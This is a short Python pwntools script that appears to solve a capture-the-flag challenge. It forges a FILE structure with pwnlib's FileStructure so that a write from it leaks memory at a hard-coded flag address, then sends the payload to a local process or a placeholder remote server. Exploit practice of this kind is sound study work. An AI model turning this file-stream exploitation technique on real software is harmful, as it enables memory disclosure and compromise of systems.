#!/usr/bin/env python3
from pwnlib.filepointer import FileStructure
from pwn import *

exe = ELF("./app")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

flag_add   = 0x404300
def main():
    r = conn()

    # good luck pwning :)
    fp  = FileStructure()
    payload = fp.write(flag_add, 0x20)
    r.recvuntil(b'> ')
    r.sendline(b'1337')
    r.recvuntil(b'edit file-struct: send 256 bytes')
    r.send(payload)
    r.interactive()


if __name__ == "__main__":
    main()
